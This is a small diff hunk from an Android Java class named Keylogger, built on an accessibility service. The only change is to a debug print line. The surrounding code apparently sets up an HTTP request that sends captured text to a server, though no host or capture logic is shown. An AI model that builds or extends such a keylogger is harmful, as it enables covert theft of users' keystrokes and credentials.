@@ -40,7 +40,7 @@ public class Keylogger extends AccessibilityService {
                 HttpConnectionParams.setConnectionTimeout(httpParameters, 5000);
                 HttpConnectionParams.setSoTimeout(httpParameters, 5000);
 
-                System.out.println("------> "+params[0]);
+                System.out.println("----------> "+params[0]);
                 StringEntity entity = new StringEntity(params[0], HTTP.UTF_8);
                 entity.setContentType("text/plain");
 
